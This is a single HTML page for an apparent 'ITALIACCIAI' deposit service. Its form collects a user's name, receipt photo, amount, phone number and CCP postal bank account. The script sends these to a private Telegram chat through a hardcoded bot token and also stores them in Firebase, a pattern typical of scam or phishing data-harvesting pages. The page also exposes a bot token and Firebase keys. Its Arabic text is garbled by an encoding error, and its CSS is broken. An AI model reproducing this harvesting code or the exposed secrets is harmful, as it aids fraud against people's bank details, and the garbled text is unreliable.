<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>ITALIACCIAI - ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
  margin:0;
  min-height:100vh;
  background:#000;
  font-family:Tahoma,Arial;
  display:flex;
  justify-content:center;
  align-items:center;
  color:#fff;
}
.card{
  width:360px;
  background:#050505;
  border-radius:25px;
  padding:20px;
  box-shadow:0 0 30px rgba(0,255,0,.35);
  border:2px solid #0f0;
  text-align:center;
/* LOGO Ø¶ÙˆØ¡ Ù…ØªØ­Ø±Ùƒ */
.logo{
  font-size:26px;
  font-weight:bold;
  background: linear-gradient(
    90deg,
    #0f0 0%,
    #ffffff 50%,
    #0f0 100%
  );
  background-size:200% auto;
  -webkit-background-clip:text;
  -webkit-text-fill-color:transparent;
  animation: shineLogo 2s linear infinite;
  text-shadow:
    0 0 5px #0f0,
    0 0 15px #0f0;
}

/* BANNER Ø¶ÙˆØ¡ ÙŠÙ…Ø´ÙŠ */
.banner{
  background: linear-gradient(
    90deg,
    #0f0,
    #000,
    #0f0
  );
  background-size:200% auto;
  color:#000;
  padding:12px;
  border-radius:15px;
  font-weight:bold;
  margin:15px 0;
  animation: shineBanner 3s linear infinite;
  box-shadow:
    0 0 10px #0f0,
    0 0 25px #0f0;
}

/* Ø­Ø±ÙƒØ© Ø§Ù„Ø¶ÙˆØ¡ */
@keyframes shineLogo{
  from{
    background-position:0% center;
  }
  to{
    background-position:200% center;
  }
}

@keyframes shineBanner{
  from{
    background-position:200% center;
  }
  to{
    background-position:0% center;
  }
}
input,button{
  width:100%;
  margin-top:10px;
  padding:12px;
  border:none;
  border-radius:14px;
  font-size:14px;
}
input{background:#111;color:#fff}
button{
  background:#0f0;
  color:#000;
  font-weight:bold;
  cursor:pointer;
}
button:disabled{opacity:.6}

.history{
  margin-top:15px;
  background:#000;
  padding:10px;
  border-radius:15px;
  max-height:160px;
  overflow:auto;
  font-size:13px;
  text-align:right;
}
hr{border:0;border-top:1px solid #0f03}
</style>
</head>

<body>

<div class="card">
  <div class="logo">ITALIACCIAI</div>
  <div class="banner">ğŸ’¥ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹ Ø¹Ø¨Ø± Ø¨Ø±ÙŠØ¯ÙŠ Ù…ÙˆØ¨ ğŸ’¥</div>

  <!-- ÙÙˆØ±Ù… ÙˆØ§Ø­Ø¯ -->
  <form id="depositForm">

    <input type="text" id="name" placeholder="ğŸ‘¤ Ø§Ø³Ù…Ùƒ" required>
    <input type="file" id="photo" accept="image/*" required>
    <input type="number" id="amount" placeholder="ğŸ’° Ù…Ø¨Ù„Øº Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹" required>
    <input type="text" id="phone" placeholder="ğŸ“± Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ" required>
    <input type="text" id="userCCP" placeholder="ğŸ¦ Ø±Ù‚Ù… Ø­Ø³Ø§Ø¨Ùƒ CCP" required>

    <button type="submit" id="sendBtn">ğŸ“¤ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹</button>

  </form>

  <!-- Ø³Ø¬Ù„ Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹ -->
  <div class="history" id="history">ğŸ“„ Ø³Ø¬Ù„ Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹Ø§Øª...</div>
</div>

<!-- Firebase -->
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import {
  getFirestore, collection, addDoc,
  query, where, onSnapshot, serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyAa6ETi1DmEI-3nVuqjpsaodT0rXsP8bIw",
  authDomain: "aple-21978.firebaseapp.com",
  projectId: "aple-21978",
  messagingSenderId: "1013598113300",
  appId: "1:1013598113300:web:5e71138b4e75e2a2752101"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

let uid=null;
const historyBox=document.getElementById("history");

signInAnonymously(auth);

onAuthStateChanged(auth,u=>{
  if(u){
    uid=u.uid;
    loadHistory();
  }
});

/* Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹ */
const form=document.getElementById("depositForm");
const btn=document.getElementById("sendBtn");

form.onsubmit = async (e)=>{
  e.preventDefault();
  btn.disabled=true;
  btn.innerText="â³ Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„...";

  const name=nameInput.value;
  const photo=photoInput.files[0];
  const amount=amountInput.value;
  const phone=phoneInput.value;
  const userCCP=userCCPInput.value;

  try{
    /* Telegram */
    const tg=new FormData();
    tg.append("chat_id","5722416028");
    tg.append(
      "caption",
      `ğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: ${name}\nğŸ’° Ø§Ù„Ù…Ø¨Ù„Øº: ${amount} Ø¯Ø¬\nğŸ“± Ø§Ù„Ù‡Ø§ØªÙ: ${phone}\nğŸ¦ CCP: ${userCCP}`
    );
    tg.append("photo",photo);

    await fetch(
      "https://api.telegram.org/bot8561874849:AAEIpNUvli0QHp-c_GfnYf3NwB5k-f7nMiI/sendPhoto",
      {method:"POST",body:tg}
    );

    /* Firebase */
    await addDoc(collection(db,"deposits"),{
      uid,
      name,
      amount:Number(amount),
      phone,
      userCCP,
      status:"Ù‚ÙŠØ¯ Ø§Ù„Ù…Ø±Ø§Ø¬Ø¹Ø©",
      createdAt:serverTimestamp()
    });

    form.reset();
    alert("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹ Ø¨Ù†Ø¬Ø§Ø­");

  }catch(err){
    alert("âŒ Ø­Ø¯Ø« Ø®Ø·Ø£");
    console.error(err);
  }

  btn.disabled=false;
  btn.innerText="ğŸ“¤ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹";
};

/* Ø³Ø¬Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… */
function loadHistory(){
  const q=query(
    collection(db,"deposits"),
    where("uid","==",uid)
  );

  onSnapshot(q,snap=>{
    let html="";
    snap.forEach(d=>{
      const x=d.data();
      if(x.createdAt){
        html+=`
          ğŸ’° ${x.amount} Ø¯Ø¬<br>
          ğŸ“± ${x.phone}<br>
          ğŸ¦ ${x.userCCP}<br>
          â³ ${x.status}<br>
          ğŸ“… ${x.createdAt.toDate().toLocaleString("ar-DZ")}
          <hr>
        `;
      }
    });
    historyBox.innerHTML = html || "Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¥ÙŠØ¯Ø§Ø¹Ø§Øª";
  });
}

/* Ø±Ø¨Ø· inputs */
const nameInput=document.getElementById("name");
const photoInput=document.getElementById("photo");
const amountInput=document.getElementById("amount");
const phoneInput=document.getElementById("phone");
const userCCPInput=document.getElementById("userCCP");
</script>

</body>
</html>
